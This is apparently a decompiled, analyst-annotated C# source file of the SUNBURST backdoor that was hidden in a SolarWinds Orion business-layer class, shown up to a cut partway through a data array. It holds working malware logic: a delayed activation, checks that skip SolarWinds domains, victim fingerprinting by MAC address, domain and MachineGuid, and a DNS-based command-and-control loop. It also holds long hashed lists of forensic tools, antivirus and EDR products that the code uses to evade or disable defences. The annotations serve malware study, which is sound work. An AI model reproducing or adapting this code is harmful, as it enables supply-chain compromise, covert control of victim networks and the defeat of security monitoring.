using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;
using SolarWinds.Orion.Core.Common.Configuration;
using SolarWinds.Orion.Core.SharedCredentials.Credentials;

namespace SolarWinds.Orion.Core.BusinessLayer
{
	internal class OrionImprovementBusinessLayer
	{
		public static bool IsAlive
		{
			get
			{
				object isAliveLock = OrionImprovementBusinessLayer._isAliveLock;
				bool result;
				lock (isAliveLock)
				{
					if (OrionImprovementBusinessLayer._isAlive)
					{
						result = true;
					}
					else
					{
						OrionImprovementBusinessLayer._isAlive = true;
						result = false;
					}
				}
				return result;
			}
		}

		private static bool svcListModified1
		{
			get
			{
				object obj = OrionImprovementBusinessLayer.svcListModifiedLock;
				bool result;
				lock (obj)
				{
					bool svcListModified = OrionImprovementBusinessLayer._svcListModified1;
					OrionImprovementBusinessLayer._svcListModified1 = false;
					result = svcListModified;
				}
				return result;
			}
			set
			{
				object obj = OrionImprovementBusinessLayer.svcListModifiedLock;
				lock (obj)
				{
					OrionImprovementBusinessLayer._svcListModified1 = value;
				}
			}
		}

		private static bool svcListModified2
		{
			get
			{
				object obj = OrionImprovementBusinessLayer.svcListModifiedLock;
				bool svcListModified;
				lock (obj)
				{
					svcListModified = OrionImprovementBusinessLayer._svcListModified2;
				}
				return svcListModified;
			}
			set
			{
				object obj = OrionImprovementBusinessLayer.svcListModifiedLock;
				lock (obj)
				{
					OrionImprovementBusinessLayer._svcListModified2 = value;
				}
			}
		}

		public static void Initialize()
		{
			try
			{
				if (OrionImprovementBusinessLayer.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) == 17291806236368054941UL /* solarwinds.businesslayerhost (SolarWinds - dev) */)
				{
					DateTime lastWriteTime = File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location);
					int num = new Random().Next(288, 336);
					if (DateTime.Now.CompareTo(lastWriteTime.AddHours((double)num)) >= 0)
					{
						OrionImprovementBusinessLayer.instance = new NamedPipeServerStream(OrionImprovementBusinessLayer.appId);
						OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out OrionImprovementBusinessLayer.status);
						if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Truncate)
						{
							OrionImprovementBusinessLayer.DelayMin(0, 0);
							OrionImprovementBusinessLayer.domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
							if (!string.IsNullOrEmpty(OrionImprovementBusinessLayer.domain4) && 
								// Continue infection only if the domain name passes the following check
							    !OrionImprovementBusinessLayer.IsNullOrInvalidName(OrionImprovementBusinessLayer.domain4))
							{
								OrionImprovementBusinessLayer.DelayMin(0, 0);
								if (OrionImprovementBusinessLayer.GetOrCreateUserID(out OrionImprovementBusinessLayer.userId))
								{
									OrionImprovementBusinessLayer.DelayMin(0, 0);
									OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(false);
									OrionImprovementBusinessLayer.Update();  // Main malicious code
									OrionImprovementBusinessLayer.instance.Close();
								}
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		private static bool UpdateNotification()
		{
			int num = 3;
			while (num-- > 0)
			{
				OrionImprovementBusinessLayer.DelayMin(0, 0);
				if (OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
				{
					return false;
				}
				if (OrionImprovementBusinessLayer.DnsHelper.CheckServerConnection(OrionImprovementBusinessLayer.apiHost))
				{
					return true;
				}
			}
			return false;
		}

		private static void Update()
		{
			bool flag = false;
			OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);
			OrionImprovementBusinessLayer.HttpHelper httpHelper = null;
			Thread thread = null;
			bool flag2 = true;
			OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
			int num = 0;
			bool flag3 = true;
			OrionImprovementBusinessLayer.DnsRecords dnsRecords = new OrionImprovementBusinessLayer.DnsRecords();
			Random random = new Random();
			int a = 0;
			if (!OrionImprovementBusinessLayer.UpdateNotification())
			{
				return;
			}
			OrionImprovementBusinessLayer.svcListModified2 = false;
			int num2 = 1;
			while (num2 <= 3 && !flag)
			{
				OrionImprovementBusinessLayer.DelayMin(dnsRecords.A, dnsRecords.A);
				if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
				{
					if (OrionImprovementBusinessLayer.svcListModified1)
					{
						flag3 = true;
					}
					num = (OrionImprovementBusinessLayer.svcListModified2 ? (num + 1) : 0);
					string hostName;
					if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New)
					{
						if (addressFamilyEx != OrionImprovementBusinessLayer.AddressFamilyEx.Error)
						{
							hostName = cryptoHelper.GetPreviousString(out flag2);
						}
						else
						{
							hostName = cryptoHelper.GetCurrentString();
						}
					}
					else
					{
						if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Append)
						{
							break;
						}
						if (!flag3)
						{
							hostName = cryptoHelper.GetNextString(dnsRecords.dnssec);
						}
						else
						{
							hostName = cryptoHelper.GetNextStringEx(dnsRecords.dnssec);
						}
					}
					addressFamilyEx = OrionImprovementBusinessLayer.DnsHelper.GetAddressFamily(hostName, dnsRecords);
					switch (addressFamilyEx)
					{
					case OrionImprovementBusinessLayer.AddressFamilyEx.NetBios:
						if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
						{
							flag3 = false;
							if (dnsRecords.dnssec)
							{
								a = dnsRecords.A;
								dnsRecords.A = random.Next(1, 3);
							}
						}
						if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New && flag2)
						{
							OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.Append;
							OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.status);
						}
						if (!string.IsNullOrEmpty(dnsRecords.cname))
						{
							dnsRecords.A = a;
							OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
							httpHelper = new OrionImprovementBusinessLayer.HttpHelper(OrionImprovementBusinessLayer.userId, dnsRecords);
							if (!OrionImprovementBusinessLayer.svcListModified2 || num > 1)
							{
								OrionImprovementBusinessLayer.svcListModified2 = false;
								thread = new Thread(new ThreadStart(httpHelper.Initialize))
								{
									IsBackground = true
								};
								thread.Start();
							}
						}
						num2 = 0;
						break;
					case OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink:
					case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
						OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.Truncate);
						OrionImprovementBusinessLayer.ProcessTracker.SetAutomaticMode();
						flag = true;
						break;
					case OrionImprovementBusinessLayer.AddressFamilyEx.Ipx:
						if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
						{
							OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.New);
						}
						flag = true;
						break;
					case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork:
					case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6:
					case OrionImprovementBusinessLayer.AddressFamilyEx.Unknown:
						goto IL_1CE;
					case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
						dnsRecords.A = random.Next(420, 540);
						break;
					default:
						goto IL_1CE;
					}
					IL_1FA:
					num2++;
					continue;
					IL_1CE:
					flag = true;
					goto IL_1FA;
				}
				break;
			}
			OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
		}

		private static string GetManagementObjectProperty(ManagementObject obj, string property)
		{
			object value = obj.Properties[property].Value;
			string text;
			if (((value != null) ? value.GetType() : null) == typeof(string[]))
			{
				text = string.Join(", ", from v in (string[])obj.Properties[property].Value
				select v.ToString());
			}
			else
			{
				object value2 = obj.Properties[property].Value;
				if (value2 != null)
				{
					if ((text = value2.ToString()) != null)
					{
						goto IL_9A;
					}
				}
				text = "";
			}
			IL_9A:
			string str = text;
			return property + ": " + str + "\n";
		}

		private static string GetNetworkAdapterConfiguration()
		{
			string text = "";
			string result;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_NetworkAdapterConfiguration where IPEnabled=true"))
				{
					foreach (ManagementObject obj in managementObjectSearcher.Get().Cast<ManagementObject>())
					{
						text += "\n";
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "Description");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "MACAddress");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "DHCPEnabled");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "DHCPServer");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "DNSHostName");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "DNSDomainSuffixSearchOrder");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "DNSServerSearchOrder");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "IPAddress");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "IPSubnet");
						text += OrionImprovementBusinessLayer.GetManagementObjectProperty(obj, "DefaultIPGateway");
					}
					result = text;
				}
			}
			catch (Exception ex)
			{
				result = text + ex.Message;
			}
			return result;
		}

		private static string GetOSVersion(bool full)
		{
			if (OrionImprovementBusinessLayer.osVersion == null || OrionImprovementBusinessLayer.osInfo == null)
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_OperatingSystem"))
					{
						ManagementObject managementObject = managementObjectSearcher.Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
						OrionImprovementBusinessLayer.osInfo = managementObject.Properties["Caption"].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties["OSArchitecture"].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties["InstallDate"].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties["Organization"].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties["RegisteredUser"].Value.ToString();
						string text = managementObject.Properties["Version"].Value.ToString();
						OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + text;
						string[] array = text.Split(new char[]
						{
							'.'
						});
						OrionImprovementBusinessLayer.osVersion = array[0] + "." + array[1];
					}
				}
				catch (Exception)
				{
					OrionImprovementBusinessLayer.osVersion = Environment.OSVersion.Version.Major + "." + Environment.OSVersion.Version.Minor;
					OrionImprovementBusinessLayer.osInfo = string.Format("[E] {0} {1} {2}", Environment.OSVersion.VersionString, Environment.OSVersion.Version, Environment.Is64BitOperatingSystem ? 64 : 32);
				}
			}
			if (!full)
			{
				return OrionImprovementBusinessLayer.osVersion;
			}
			return OrionImprovementBusinessLayer.osInfo;
		}

		private static string ReadDeviceInfo()
		{
			try
			{
				return (from nic in NetworkInterface.GetAllNetworkInterfaces()
				where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
				select nic.GetPhysicalAddress().ToString()).FirstOrDefault<string>();
			}
			catch (Exception)
			{
			}
			return null;
		}

		private static bool GetOrCreateUserID(out byte[] hash64)
		{
			string text = OrionImprovementBusinessLayer.ReadDeviceInfo();
			hash64 = new byte[8];
			Array.Clear(hash64, 0, hash64.Length);
			if (text == null)
			{
				return false;
			}
			text += OrionImprovementBusinessLayer.domain4;
			try
			{
				text += OrionImprovementBusinessLayer.RegistryHelper.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "");
			}
			catch
			{
			}
			using (MD5 md = MD5.Create())
			{
				byte[] bytes = Encoding.ASCII.GetBytes(text);
				byte[] array = md.ComputeHash(bytes);
				if (array.Length < hash64.Length)
				{
					return false;
				}
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array2 = hash64;
					int num = i % hash64.Length;
					array2[num] ^= array[i];
				}
			}
			return true;
		}

		private static bool IsNullOrInvalidName(string domain4)
		{
			string[] array = domain4.ToLower().Split(new char[]
			{
				'.'
			});


			if (array.Length >= 2)
			{
				string s = array[array.Length - 2] + "." + array[array.Length - 1];
				// Check if the machine's domain name matches one of the SolarWinds networks
				foreach (ulong num in OrionImprovementBusinessLayer.patternHashes)
				{
					if (OrionImprovementBusinessLayer.GetHash(s) == num)
					{
						// Domain failed checks, exit
						return true;
					}
				}
			}
			foreach (string pattern in OrionImprovementBusinessLayer.patternList)
			{
				if (Regex.Match(domain4, pattern).Success)
				{
					// Domain failed checks, exit
					return true;
				}
			}



			return false;
		}


		private static void DelayMs(double minMs, double maxMs)
		{
			if ((int)maxMs == 0)
			{
				minMs = 1000.0;
				maxMs = 2000.0;
			}
			double num;
			for (num = minMs + new Random().NextDouble() * (maxMs - minMs); num >= 2147483647.0; num -= 2147483647.0)
			{
				Thread.Sleep(int.MaxValue);
			}
			Thread.Sleep((int)num);
		}

		private static void DelayMin(int minMinutes, int maxMinutes)
		{
			if (maxMinutes == 0)
			{
				minMinutes = 30;
				maxMinutes = 120;
			}
			OrionImprovementBusinessLayer.DelayMs((double)minMinutes * 60.0 * 1000.0, (double)maxMinutes * 60.0 * 1000.0);
		}

		private static ulong GetHash(string s)
		{
			ulong num = 14695981039346656037UL; /* NOT A HASH - FNV base offset */
			try
			{
				foreach (byte b in Encoding.UTF8.GetBytes(s))
				{
					num ^= (ulong)b;
					num *= 1099511628211UL; /* NOT A HASH - FNV prime */
				}
			}
			catch
			{
			}
			return num ^ 6605813339339102567UL; /* NOT A HASH - XOR value */
		}

		private static string Quote(string s)
		{
			if (s != null && s.Contains(" ") && !s.Contains("\""))
			{
				return "\"" + s + "\"";
			}
			return s;
		}

		private static string Unquote(string s)
		{
			if (s.StartsWith('"'.ToString()) && s.EndsWith('"'.ToString()))
			{
				return s.Substring(1, s.Length - 2);
			}
			return s;
		}

		private static string ByteArrayToHexString(byte[] bytes)
		{
			StringBuilder stringBuilder = new StringBuilder(bytes.Length * 2);
			foreach (byte b in bytes)
			{
				stringBuilder.AppendFormat("{0:x2}", b);
			}
			return stringBuilder.ToString();
		}

		private static byte[] HexStringToByteArray(string hex)
		{
			byte[] array = new byte[hex.Length / 2];
			for (int i = 0; i < hex.Length; i += 2)
			{
				array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
			}
			return array;
		}

		public OrionImprovementBusinessLayer()
		{
		}

		// Note: this type is marked as 'beforefieldinit'.
		static OrionImprovementBusinessLayer()
		{
		}

		private static volatile bool _isAlive = false;

		private static readonly object _isAliveLock = new object();

		private static readonly ulong[] assemblyTimeStamps = new ulong[]
		{
			2597124982561782591UL      /* apimonitor-x64 (Rohitab - RE/Malware analysis) */,
			2600364143812063535UL      /* apimonitor-x86 (Rohitab - RE/Malware analysis) */,
			13464308873961738403UL     /* autopsy64 (Autopsy - Forensics) */,
			4821863173800309721UL      /* autopsy (Autopsy - Forensics) */,
			12969190449276002545UL     /* autoruns64 (Autoruns - RE/Malware analysis) */,
			3320026265773918739UL      /* autoruns (Autoruns - RE/Malware analysis) */,
			12094027092655598256UL     /* autorunsc64 (Autoruns - RE/Malware analysis) */,
			10657751674541025650UL     /* autorunsc (Autoruns - RE/Malware analysis) */,
			11913842725949116895UL     /* binaryninja (Binary Ninja - RE/Malware analysis) */,
			5449730069165757263UL      /* blacklight (Blacklight - Forensics) */,
			292198192373389586UL       /* cff explorer (NTCore Explorer Suite - RE/Malware analysis) */,
			12790084614253405985UL     /* cutter (Rizin Cutter - RE/Malware analysis) */,
			5219431737322569038UL      /* de4dot (de4dot - Forensics) */,
			15535773470978271326UL     /* debugview (DebugView - RE/Malware analysis) */,
			7810436520414958497UL      /* diskmon (DiskMon - RE/Malware analysis) */,
			13316211011159594063UL     /* dnsd (Symantec - Antivirus) */,
			13825071784440082496UL     /* dnspy (dnSpy - RE/Malware analysis) */,
			14480775929210717493UL     /* dotpeek32 (dotPeek - RE/Malware analysis) */,
			14482658293117931546UL     /* dotpeek64 (dotPeek - RE/Malware analysis) */,
			8473756179280619170UL      /* dumpcap (Wireshark - RE/Malware analysis) */,
			3778500091710709090UL      /* evidence center (Belkasoft Evidence Center - Forensics) */,
			8799118153397725683UL      /* exeinfope (Exeinfo PE - RE/Malware analysis) */,
			12027963942392743532UL     /* fakedns (fakedns (iDefense) - RE/Malware analysis) */,
			576626207276463000UL       /* fakenet (fakenet - RE/Malware analysis) */,
			7412338704062093516UL      /* ffdec (Free Flash Decompiler - RE/Malware analysis) */,
			682250828679635420UL       /* fiddler (Fiddler - RE/Malware analysis) */,
			13014156621614176974UL     /* fileinsight (McAfee - RE/Malware analysis) */,
			18150909006539876521UL     /* floss (FireEye - RE/Malware analysis) */,
			10336842116636872171UL     /* gdb (gdb - RE/Malware analysis) */,
			12785322942775634499UL     /* hiew32demo (Hiew - RE/Malware analysis) */,
			13260224381505715848UL     /* hiew32 (Hiew - RE/Malware analysis) */,
			17956969551821596225UL     /* hollows_hunter (hollows hunter - RE/Malware analysis) */,
			8709004393777297355UL      /* idaq64 (IDA - RE/Malware analysis) */,
			14256853800858727521UL     /* idaq (IDA - RE/Malware analysis) */,
			8129411991672431889UL      /* idr (InsightDR? - RE/Malware analysis) */,
			15997665423159927228UL     /* ildasm (IL Disassembler - RE/Malware analysis) */,
			10829648878147112121UL     /* ilspy (ILSpy - RE/Malware analysis) */,
			9149947745824492274UL      /* jd-gui (Java Decompiler - RE/Malware analysis) */,
			3656637464651387014UL      /* lordpe (LordPE - RE/Malware analysis) */,
			3575761800716667678UL      /* officemalscanner (Officemalscanner - RE/Malware analysis) */,
			4501656691368064027UL      /* ollydbg (OllyDbg - RE/Malware analysis) */,
			10296494671777307979UL     /* pdfstreamdumper (PDFStreamDumper - RE/Malware analysis) */,
			14630721578341374856UL     /* pe-bear (PE-bear - RE/Malware analysis) */,
			4088976323439621041UL      /* pebrowse64 (Pebrowser - RE/Malware analysis) */,
			9531326785919727076UL      /* peid (PeiD - RE/Malware analysis) */,
			6461429591783621719UL      /* pe-sieve32 (PE-sieve - RE/Malware analysis) */,
			6508141243778577344UL      /* pe-sieve64 (PE-sieve - RE/Malware analysis) */,
			10235971842993272939UL     /* pestudio (pestudio - RE/Malware analysis) */,
			2478231962306073784UL      /* peview (Peview - RE/Malware analysis) */,
			9903758755917170407UL      /* pexplorer (Pexplorer - RE/Malware analysis) */,
			14710585101020280896UL     /* ppee (PPEE - RE/Malware analysis) */,
			14710585101020280896UL     /* ppee (PPEE - RE/Malware analysis) */,
			13611814135072561278UL     /* procdump64 (ProcDump - RE/Malware analysis) */,
			2810460305047003196UL      /* procdump (ProcDump - RE/Malware analysis) */,
			2032008861530788751UL      /* processhacker (Process Hacker - RE/Malware analysis) */,
			27407921587843457UL        /* procexp64 (Process Explorer - RE/Malware analysis) */,
			6491986958834001955UL      /* procexp (Process Explorer - RE/Malware analysis) */,
			2128122064571842954UL      /* procmon (ProcMon - RE/Malware analysis) */,
			10484659978517092504UL     /* prodiscoverbasic (ProDiscovery - Forensics) */,
			8478833628889826985UL      /* py2exedecompiler (Py2ExeDecompiler - RE/Malware analysis) */,
			10463926208560207521UL     /* r2agent (Radare2 - RE/Malware analysis) */,
			7080175711202577138UL      /* rabin2 (Radare2 - RE/Malware analysis) */,
			8697424601205169055UL      /* radare2 (Radare2 - RE/Malware analysis) */,
			7775177810774851294UL      /* ramcapture64 (Ram Capturer - Forensics) */,
			16130138450758310172UL     /* ramcapture (Ram Capturer - Forensics) */,
			506634811745884560UL       /* reflector (Red Gate Reflector - RE/Malware analysis) */,
			18294908219222222902UL     /* regmon (RegMon - RE/Malware analysis) */,
			3588624367609827560UL      /* resourcehacker (Resource Hacker - RE/Malware analysis) */,
			9555688264681862794UL      /* retdec-ar-extractor (Avast RetDec - RE/Malware analysis) */,
			5415426428750045503UL      /* retdec-bin2llvmir (Avast RetDec - RE/Malware analysis) */,
			3642525650883269872UL      /* retdec-bin2pat (Avast RetDec - RE/Malware analysis) */,
			13135068273077306806UL     /* retdec-config (Avast RetDec - RE/Malware analysis) */,
			3769837838875367802UL      /* retdec-fileinfo (Avast RetDec - RE/Malware analysis) */,
			191060519014405309UL       /* retdec-getsig (Avast RetDec - RE/Malware analysis) */,
			1682585410644922036UL      /* retdec-idr2pat (Avast RetDec - RE/Malware analysis) */,
			7878537243757499832UL      /* retdec-llvmir2hll (Avast RetDec - RE/Malware analysis) */,
			13799353263187722717UL     /* retdec-macho-extractor (Avast RetDec - RE/Malware analysis) */,
			1367627386496056834UL      /* retdec-pat2yara (Avast RetDec - RE/Malware analysis) */,
			12574535824074203265UL     /* retdec-stacofin (Avast RetDec - RE/Malware analysis) */,
			16990567851129491937UL     /* retdec-unpacker (Avast RetDec - RE/Malware analysis) */,
			8994091295115840290UL      /* retdec-yarac (Avast RetDec - RE/Malware analysis) */,
			13876356431472225791UL     /* rundotnetdll (RunDotNetDLL - RE/Malware analysis) */,
			14968320160131875803UL     /* sbiesvc (Sandboxie - Virtualization/container) */,
			14868920869169964081UL     /* scdbg (SCDBG - RE/Malware analysis) */,
			106672141413120087UL       /* scylla_x64 (Scylla - RE/Malware analysis) */,
			79089792725215063UL        /* scylla_x86 (Scylla - RE/Malware analysis) */,
			5614586596107908838UL      /* shellcode_launcher (Shellcode Launcher - RE/Malware analysis) */,
			3869935012404164040UL      /* solarwindsdiagnostics (SolarWinds - dev/test) */,
			3538022140597504361UL      /* sysmon64 (Sysmon - EDR) */,
			14111374107076822891UL     /* sysmon (Sysmon - EDR) */,
			7982848972385914508UL      /* task explorer (Task Explorer - RE/Malware analysis) */,
			8760312338504300643UL      /* task explorer-64 (Task Explorer - RE/Malware analysis) */,
			17351543633914244545UL     /* tcpdump (tcpdump - RE/Malware analysis) */,
			7516148236133302073UL      /* tcpvcon (TCPView - RE/Malware analysis) */,
			15114163911481793350UL     /* tcpview (TCPView - RE/Malware analysis) */,
			15457732070353984570UL     /* vboxservice (VirtualBox - Virtualization/container) */,
			16292685861617888592UL     /* win32_remote (IDA - RE/Malware analysis) */,
			10374841591685794123UL     /* win64_remotex64 (IDA - RE/Malware analysis) */,
			3045986759481489935UL      /* windbg (WinDbg (Microsoft) - RE/Malware analysis) */,
			17109238199226571972UL     /* windump (WinPcap WinDump - RE/Malware analysis) */,
			6827032273910657891UL      /* winhex64 (WinHex - RE/Malware analysis) */,
			5945487981219695001UL      /* winhex (WinHex - RE/Malware analysis) */,
			8052533790968282297UL      /* winobj (WinObj - RE/Malware analysis) */,
			17574002783607647274UL     /* wireshark (Wireshark - RE/Malware analysis) */,
			3341747963119755850UL      /* x32dbg (x64dbg - RE/Malware analysis) */,
			14193859431895170587UL     /* x64dbg (x64dbg - RE/Malware analysis) */,
			17439059603042731363UL     /* xwforensics64 (X-Ways Forensics - RE/Malware analysis) */,
			17683972236092287897UL     /* xwforensics (X-Ways Forensics - RE/Malware analysis) */,
			700598796416086955UL       /* redcloak (Red Cloak / SecureWorks - EDR) */,
			3660705254426876796UL      /* avgsvc (AVG - Antivirus) */,
			12709986806548166638UL     /* avgui (AVG - Antivirus) */,
			3890794756780010537UL      /* avgsvca (AVG - Antivirus) */,
			2797129108883749491UL      /* avgidsagent (AVG - Antivirus) */,
			3890769468012566366UL      /* avgsvcx (AVG - Antivirus) */,
			14095938998438966337UL     /* avgwdsvcx (AVG - Antivirus) */,
			11109294216876344399UL     /* avgadminclientservice (AVG - Antivirus) */,
			1368907909245890092UL      /* afwserv (Avast - Antivirus) */,
			11818825521849580123UL     /* avastui (Avast - Antivirus) */,
			8146185202538899243UL      /* avastsvc (Avast - Antivirus) */,
			2934149816356927366UL      /* aswidsagent (Avast/AVG - Antivirus) */,
			13029357933491444455UL     /* aswidsagenta (Avast/AVG - Antivirus) */,
			6195833633417633900UL      /* aswengsrv (Avast/AVG - Antivirus) */,
			2760663353550280147UL      /* avastavwrapper (Avast - Antivirus) */,
			16423314183614230717UL     /* bccavsvc (Avast - Antivirus) */,
			2532538262737333146UL      /* psanhost (Panda Security - EDR) */,
			4454255944391929578UL      /* psuaservice (Panda Security - EDR) */,
			6088115528707848728UL      /* psuamain (Panda Security - EDR) */,
			13611051401579634621UL     /* avp (Kaspersky - Antivirus) */,
			18147627057830191163UL     /* avpui (Kaspersky - Antivirus) */,
			17633734304611248415UL     /* ksde (Kaspersky - EDR) */,
			13581776705111912829UL     /* ksdeui (Kaspersky - EDR) */,
			7175363135479931834UL      /* tanium (Tanium - EDR) */,
			3178468437029279937UL      /* taniumclient (Tanium - EDR) */,
			13599785766252827703UL     /* taniumdetectengine (Tanium - EDR) */,
			6180361713414290679UL      /* taniumendpointindex (Tanium - EDR) */,
			8612208440357175863UL      /* taniumtracecli (Tanium - EDR) */,
			8408095252303317471UL      /* taniumtracewebsocketclient64 (Tanium - EDR) */
		};

		private static readonly ulong[] configTimeStamps = new ulong[]
		{
			17097380490166623672UL     /* cybkerneltracker.sys (CyberArk - EDR) */,
			15194901817027173566UL     /* atrsdfw.sys (Altiris / Symantec - EDR) */,
			12718416789200275332UL     /* eaw.sys (Raytheon Cyber Solutions - EDR) */,
			18392881921099771407UL     /* rvsavd.sys (OPSWAT / CJSC Returnil - EDR) */,
			3626142665768487764UL      /* dgdmk.sys (Verdasys - EDR) */,
			12343334044036541897UL     /* sentinelmonitor.sys (SentinelOne - EDR) */,
			397780960855462669UL       /* hexisfsmonitor.sys (Hexis Cyber Solutions - EDR) */,
			6943102301517884811UL      /* groundling32.sys (Dell Secureworks - EDR) */,
			13544031715334011032UL     /* groundling64.sys (Dell Secureworks - EDR) */,
			11801746708619571308UL     /* safe-agent.sys (SAFE-Cyberdefense - EDR) */,
			18159703063075866524UL     /* crexecprev.sys (Cybereason - EDR) */,
			835151375515278827UL       /* psepfilter.sys (Absolute Software - EDR) */,
			16570804352575357627UL     /* cve.sys (Absolute Software Corp. - EDR) */,
			1614465773938842903UL      /* brfilter.sys (Bromium - App allowlisting) */,
			12679195163651834776UL     /* brcow_x_x_x_x.sys (Bromium - App allowlisting) */,
			2717025511528702475UL      /* lragentmf.sys (LogRhythm - EDR) */,
			17984632978012874803UL     /* libwamf.sys (OPSWAT - EDR development) */
		};

		private static readonly object svcListModifiedLock = new object();

		private static volatile bool _svcListModified1 = false;

		private static volatile bool _svcListModified2 = false;

		private static readonly OrionImprovementBusinessLayer.ServiceConfiguration[] svcList = new OrionImprovementBusinessLayer.ServiceConfiguration[]
		{
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					5183687599225757871UL /* msmpeng (Windows Defender - EDR) */
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 917638920165491138UL /* windefend (Windows Defender - EDR) */,
						started = true
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					10063651499895178962UL /* mssense (Windows Defender ATP - EDR) */
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 16335643316870329598UL /* sense (Windows Defender ATP - EDR) */,
						started = true
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					10501212300031893463UL /* microsoft.tri.sensor (MS Azure ATP - EDR) */,
					155978580751494388UL /* microsoft.tri.sensor.updater (MS Azure ATP - EDR) */
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[0]
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					17204844226884380288UL /* cavp (Comodo? - Antivirus?) */,
					5984963105389676759UL /* cb (Carbon Black - App allowlisting) */
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 11385275378891906608UL /* carbonblack (Carbon Black - App allowlisting) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 13693525876560827283UL /* carbonblackk (Carbon Black - App allowlisting) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 17849680105131524334UL /* cbcomms (Carbon Black - App allowlisting) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 18246404330670877335UL /* cbstream (Carbon Black - App allowlisting) */,
						DefaultValue = 3U
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					8698326794961817906UL /* csfalconservice (Crowdstrike Falcon - EDR) */,
					9061219083560670602UL /* csfalconcontainer (Crowdstrike Falcon - EDR) */
				},
